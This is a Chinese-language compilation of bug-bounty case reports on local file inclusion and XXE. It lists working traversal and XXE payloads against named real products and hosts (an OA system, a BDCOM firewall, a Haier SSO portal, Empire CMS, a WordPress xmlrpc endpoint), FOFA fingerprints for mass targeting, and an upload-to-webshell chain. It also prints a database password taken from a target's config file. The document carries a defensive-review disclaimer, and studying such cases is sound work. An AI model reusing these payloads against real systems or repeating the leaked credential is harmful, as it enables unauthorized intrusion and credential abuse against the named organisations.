# 文件包含与 XXE 实战案例（ima 案例库深挖）

> **回查原文** → `ima-retrieval-index.md` §三（ima `src报告/文件包含/` + `src报告/XXE/` 的 folder_id + 关键词）。

> 来源：ima 知识库 `src` → `src报告/文件包含/`（Web 8 条）+ `src报告/XXE/`（Web 2 + EduSRC 1 = 3 条），去重后共 9 份唯一，实读 11 份（含 2 对同名去重件各读 1 次重复件以确认字节一致）
> 定位：小体量类型的**真实参数点、协议与 payload、真实定级**；方法论见 `path-traversal-lfi-test.md` 与 `xxe-test.md`。
> 生成日期：2026-09-14

> ⚠️ 红线声明：仅作威胁认知与防守复盘，SRC 一律不做。本文中医科大学 XXE 案例含真实学生姓名/学号等个人隐私数据，已在 2.4 节逐处标注 `⚠️ 红线`，禁止在 SRC 之外传播或用于任何社工/钓鱼/账号交易场景。

## 第一部分：文件包含（LFI）

### 1.1 参数点与业务场景速查表

| 系统/场景 | 参数名 | 包含方式（本地/远程/日志/伪协议） | 利用 payload | 来源案例 |
|---|---|---|---|---|
| 奥德美 OA 登陆系统（通达系 `/general/` 路径） | `url`（POST json 体内） | 本地文件包含 + 路径穿越 | `POST /mac/gateway.php` → `json={"url":"/general/../../mysql5/my.ini"}` | 奥德美生物科技文件包含 |
| 某业务系统下载接口 | `filename` + `filepath` | 本地文件读取 + 穿越（需带基目录前缀） | `Download.action?filename=&filepath=/Uploads/2020/../../../etc/passwd` | 从任意文件读取到代码审计获取权限 |
| 帝国 CMS 7.5 计划任务 | `filename`（配合 `ecms=dotask&id`） | 本地文件包含 `include_once()` | `task.php?ecms=dotask&id=2&filename=1.txt`（1.txt 含 phpinfo） | 帝国cms任意文件包含 |
| 好视通 fastmeeting 视频会议 | `fileName`（GET） | 本地文件读取 + 穿越 | `GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini` | 好视通 toDownload.do |
| 某博 CMS 下载 | `url`（base64） | 本地文件读取 + 伪协议/后缀绕过 | `/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8`（解码 `data/config.ph<`） | 某博CMS任意文件读取 |
| BDCOM 下一代防火墙（未授权） | `file_name` | 未授权本地文件下载 | `/webui/?g=sys_dia_data_down&file_name=../etc/passwd` | 上海博达防火墙文件包含 |
| 海尔 portal SSO（nidp）静态资源 | 路径段（反斜杠编码） | 本地文件读取 + 穿越（`%5c`） | `/static/js/..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini` | XXSRC一处文件读取 |

### 1.2 利用链（读源码 → 找马路径 → 日志投毒/上传包含 → getshell；php://filter 与 data:// 用法）

1. **读配置/口令**：LFI 直读 `my.ini`、`/etc/passwd`、`win.ini`、`config.php`，拿到数据库口令或服务路径（奥德美、某博、博达、海尔、好视通）。
2. **读源码闭环 getshell**（从任意文件读取到代码审计获取权限）：文件读取权限为 root → 读 `/etc/shadow` 确认 → 用 `/var/lib/mlocate/mlocate.db` 枚举全盘路径 → 发现运维打包的 `bak.zip` 源码 → 代码审计 `UploadFile` 发现任意上传 → jsp 被 `/uploads/` 限制 → 因 `filePath` 可控，跨目录上传到 `help` 目录 → 访问 jsp 拿到 webshell。
3. **计划任务包含执行**（帝国 CMS）：后台建计划任务写 `1.txt`(phpinfo) 到 `e/tasks/`，`task.php` 中 `include_once('../tasks/'.$filename)` 未过滤 → 触发即执行 PHP。
4. **伪协议补充**：某博 CMS 用 base64 参数 + `xxx.ph<` 绕过 `.php` 黑名单（Windows 通配）；通用可读源码用 `php://filter/convert.base64-encode/resource=xxx.php`（本文案例未直接出现，方法论文件补）。

### 1.3 按功能点的排查 Checklist

- 下载/导出/附件：`filename`、`filepath`、`url`、`file`、`path`、`f`、`doc`、`name` 等参数 fuzz `../`、`..%2f`、`..%5c`、`....//`。
- 上传后访问：先试任意读确认包含点，再尝试 `php://filter`/`data://` 读源码或 `expect://`/`phar://` 执行（按语言支持）。
- 后台功能（计划任务、模板、插件）：`filename`/`file` 拼接进 `include` 的点优先测。
- 设备/未授权接口：先验证是否需登录，`sys_dia_data_down`、`toDownload.do` 类下载点常未授权。
- 跨目录上传：上传点若 `filePath` 可控，绕过 `/uploads/` 执行限制，传马到可解析目录。

### 1.4 案例索引

| # | 报告名 | 平台 | 目标/系统 | 参数点 | payload | 结果/定级 |
|---|---|---|---|---|---|---|
| 1 | 奥德美生物科技(中山)有限公司登陆系统文件包含 | Web | 奥德美 OA（通达系） | `url`(POST json) | `json={"url":"/general/../../mysql5/my.ini"}` | 读到 my.ini 含数据库口令；原文未给厂商评级（危害高） |
| 1b | 同上 `_(1)` | Web | 同上 | 同上 | 同上 | **去重件**：file_size 198228 与 #1 一致，内容相同 |
| 2 | 从任意文件读取到代码审计获取权限 | Web | 某业务系统 | `filename`+`filepath` | `filepath=/Uploads/2020/../../../etc/passwd` | 读 /etc/passwd·shadow( root)→mlocate.db→bak.zip→审计上传跨目录传 jsp getshell；原文未评级 |
| 3 | 帝国cms存在任意文件包含漏洞 | Web | 帝国 CMS 7.5 | `filename` | `task.php?ecms=dotask&id=2&filename=1.txt` | `include_once` 含 phpinfo 成功执行（RCE 链）；原文未评级 |
| 4 | 好视通 fastmeeting toDownload.do 任意文件读取 | Web | 好视通视频会议 | `fileName` | `fileName=../../../../../../../../../../../../../../windows/win.ini` | 读 win.ini；指纹 `app="好视通-视频会议"`；原文未评级 |
| 5 | 某博CMS存在任意文件读取漏洞 | Web | 某博 CMS | `url`(base64) | `url=ZGF0YS9jb25maWcucGg8` | 读 `config.php`（`xxx.ph<` 绕 .php 黑名单）；原文未评级 |
| 6 | 上海博达数据通信有限公司 文件包含 | Web | BDCOM 下一代防火墙 | `file_name` | `/webui/?g=sys_dia_data_down&file_name=../etc/passwd` | 未授权读 /etc/passwd（多 IP 复现）；危害高，原文未评级 |
| 7 | XXSRC一处文件读取 | Web | 海尔 portal(nidp SSO) | 路径段 | `..%5c..%5c..%5c..%5cwindows%5cwin.ini` | 反斜杠 `%5c` 穿越读 win.ini；原文未评级 |

案例精读（唯一件，每份约 120–200 字）：

- **#1 奥德美 OA**：通达系 OA 登陆口 `POST /mac/gateway.php`，请求体 `json={"url":"/general/../../mysql5/my.ini"}`。`url` 直接拼接进包含逻辑且未校验，借 `../` 跳出 web 目录读到 MySQL 配置 `my.ini`，明文暴露数据库端口(3336)、字符集及数据库口令 `56B\k^0S#TryUFWky0X!PltpL`。拿到口令后可直连数据库或进一步读源码，属高危文件包含/读取。
- **#2 读源码到 getshell**：下载接口 `Download.action` 的 `filepath` 需带 `/Uploads/2020/` 基目录才能跨目录，最终 `filepath=/Uploads/2020/../../../etc/passwd` 读成功且为 root。利用 `mlocate.db` 拿到全盘路径，发现运维 `bak.zip` 下载源码；审计出 `UploadFile` 无类型限制，jsp 被 `/uploads/` 拦，遂用可控 `filePath` 跨目录传 `help` 目录落地 webshell。完整 RCE 链。
- **#3 帝国 CMS 7.5**：`/e/admin/task.php` 中 `$file='../tasks/'.$r['filename']; include_once($file);` 未过滤。后台建计划任务，执行文件名填 `1.txt`(内容为 `<?php phpinfo();?>`)，访问 `task.php?ecms=dotask&id=<任务id>&filename=1.txt` 即包含执行，返回 phpinfo。需后台权限，但计划任务包含点典型，可作为 CMS 后渗透手法。
- **#4 好视通**：`/register/toDownload.do?fileName=` 任意文件遍历，payload 多层 `../` 读 `windows/win.ini`，响应含 `support` 即中招。指纹 `app="好视通-视频会议"`，可用空间引擎批量测绘。属无回显限制下的配置读取，常判中危。
- **#5 某博 CMS**：`/inc/job/download.php` 对 `$url` 做 base64 解码后 `eregi(".php",...)` 拦截 php 后缀，Windows 下用 `xxx.ph<` 绕过（`<` 通配）。主页打 `url=ZGF0YS9jb25maWcucGg8`（=`data/config.ph<`）即可下载 `config.php` 源码，泄露数据库配置。典型 Windows 后缀绕过。
- **#6 博达防火墙**：BDCOM 下一代防火墙 `/webui/?g=sys_dia_data_down&file_name=../etc/passwd` 未授权文件下载，FOFA `fid="SH04tS10tiKl7E3bHi3HkQ==" && country="CN"` 批量定位，多台设备复现读到 `/etc/passwd`（含 root 口令哈希）。未授权+设备级影响，建议评高危。
- **#7 海尔 SSO**：`portal.haier.com` 经 nidp 单点跳转后，静态资源点 `9090/static/js/..%5c..%5c..%5c..%5cwindows%5cwin.ini` 用 `%5c`（反斜杠 URL 编码）做目录穿越读到 `win.ini`。提示：Windows 目标除 `../` 外务必测 `%5c`、`%2f` 及 `..\` 变体。

## 第二部分：XXE

### 2.1 触发点速查表（XML 上传、接口 body、SOAP、Office 文档解析、SVG、RSS、SAML…）

| 触发点/系统 | 注入位置 | payload | 回显方式（回显/报错/OOB） | 来源案例 |
|---|---|---|---|---|
| WordPress `xmlrpc.php` | POST body（XML-RPC 方法） | `system.listMethods` 枚举 → `pingback.ping` 带外部实体 | OOB（DNSLog 回调） | 医科大学漏洞xxe（EduSRC） |
| XML 注入通用面 | 请求 XML 数据体 | 外部实体 `<!ENTITY xxe SYSTEM "file:///...">` | 回显/报错/OOB 皆可能 | 聊聊XML注入攻击 |

### 2.2 无回显场景（外带 DTD / Blind OOB / 报错带外）

- **Blind OOB**：无回显时借外部 DTD 把文件内容拼进子实体 URL 外带，或用参数实体 `%` 在 DTD 内发起 `http://` 请求（如 `http://ocsucy.dnslog.cn/`）。医科大学案例即 `pingback.ping` 方法体内植入外部实体，DNSLog 收到回调即证明可发起外部请求（SSRF/XXE 链）。
- **协议支持（按解析库）**：libxml2 支持 `file/http/ftp`；PHP 额外 `php/compress.zlib/compress.bzip2/data/glob/phar`；Java 支持 `http/https/ftp/jar/netdoc`；.NET 支持 `file/http/https/ftp`。读取含特殊字符/本身就是 XML 的文件时，PHP 用 `php://filter/convert.base64-encode` 编码后再外带最稳。
- **报错带外**：故意触发解析错误，把文件内容压进报错信息回显。

### 2.3 按功能点的排查 Checklist

- 凡是 `Content-Type: text/xml` 或请求体为 XML 的接口：登录、上传、导入（Office/SVG/RSS/Atom）、SOAP/WSDL、SAML、XML-RPC（WordPress `xmlrpc.php`）、OAuth/单点。
- 先发畸形 XML 看报错是否回显内部路径/版本，确认解析器。
- 先测回显实体读本地文件，再测 `http://` 外带判断出网。
- 枚举可用方法（`system.listMethods`、`listMethods`）。
- 防御侧：禁用外部实体（`LIBXML_NONET`/禁用 `DOCTYPE`）、输入合法性校验、WAF 可疑包分析。

### 2.4 案例索引

| # | 报告名 | 平台 | 目标/系统 | 参数点 | payload | 结果/定级 |
|---|---|---|---|---|---|---|
| 8 | 20-聊聊XML注入攻击 | Web | 通用/教学 | XML 数据体 | 外部实体/DTD 各类 | 理论+协议表+防御；原文未评级 |
| 8b | 同上 `_20210506214051` | Web | 同上 | 同上 | 同上 | **去重件**：file_size 2169286 与 #8 一致，内容相同 |
| 9 | 医科大学漏洞xxe | EduSRC | 某医科大学 WordPress | `xmlrpc.php` body | `pingback.ping` 外部实体 → `http://ocsucy.dnslog.cn/` | DNSLog 回调证明 XXE/SSRF；⚠️ 红线：同报告含真实学生姓名/学号接口泄露，仅防守复盘，禁止外传 |

案例精读（唯一件）：

- **#8 聊聊XML注入攻击（京东安全小课堂）**：系统梳理 XML 注入五大类——XML Data Injection、XXE、XSLT 注入、XPath/XQuery 注入、SOAP 注入。给出按解析库的协议对照表（libxml2/PHP/Java/.NET 各自支持的 `file/http/ftp/php/phar/data/glob` 等），强调 PHP 用 `php://filter base64` 读取含特殊字符文件；危害含权限绕过、读文件、命令执行、内网探测(SSRF)、DoS(xee)。防御：禁用外部实体+合法性校验+WAF。
- **#9 医科大学 XXE（EduSRC）** ⚠️ 红线：目标 `xmlrpc.php` 先 `system.listMethods` 枚举方法，定位 `pingback.ping`；在其 XML 体植入外部实体指向 `http://ocsucy.dnslog.cn/`，DNSLog 收到请求即证明存在 XXE/出网（SSRF 链）。**注意**：该报告同一页面还展示后台学生缴费接口 `stuPay/datas` 泄露真实学生姓名、学号等个人隐私数据 ⚠️ 红线——此类个人信息严禁在 SRC 之外留存或传播，本报告仅作威胁认知与防守复盘，SRC 一律不做。

## 第三部分：共同注意点（两者常被厂商判"低危/信息泄露"，如何论证危害升档）

- **LFI/任意读常被判"信息泄露/低危"**：升档论据——①读到 `/etc/shadow`、数据库口令即等于凭据泄露，可直连拿数据；②读取权限为 root 说明隔离失效；③读 `mlocate.db`/源码 → 任意上传 getshell（#2 完整 RCE 链）；④设备/防火墙未授权读等于边界失守（#6）。把"读到什么敏感文件"和"能否进一步利用"写实。
- **XXE 常被判"信息泄露"**：升档论据——①能读 `/etc/passwd`/`config` 即凭据/配置泄露；②能 OOB 出网说明并存 SSRF，可打内网；③结合报错带外拿到更多内网资产。无回显也必须用 DNSLog/附带证明"出网成功"再报。
- 两类的共同写法：给出**确切读到的敏感内容截图/字段**、**利用链终点**（getshell / 内网可达），而非只报"可读取任意文件"。

## 第四部分：未精读清单（标题级归类）

无。11 条全部实读，2 对去重件（奥德美 `_(1)`、聊聊XML `_20210506214051`）已实读确认字节一致，不另计唯一份。

## 第五部分：素材缺口

- 文件包含缺**远程包含(RFI)/日志投毒/php://filter 读源码/data:// 执行**的实战样本（现有案例偏本地读配置与包含执行，伪协议利用仅方法论提及，建议后续补 1–2 份）。
- XXE 缺**回显读文件完整 payload 样本**与 **Office/SVG/RSS 触发点**实战；现有仅 WordPress xmlrpc 的 OOB 与教学文。
- 教育侧文件包含缺"校园设备/教务系统"样本，仅 XXE 有 1 条 EduSRC。
- 两类型均缺厂商**真实定级**记录（原文多半未标注），升档论证需自行补充。
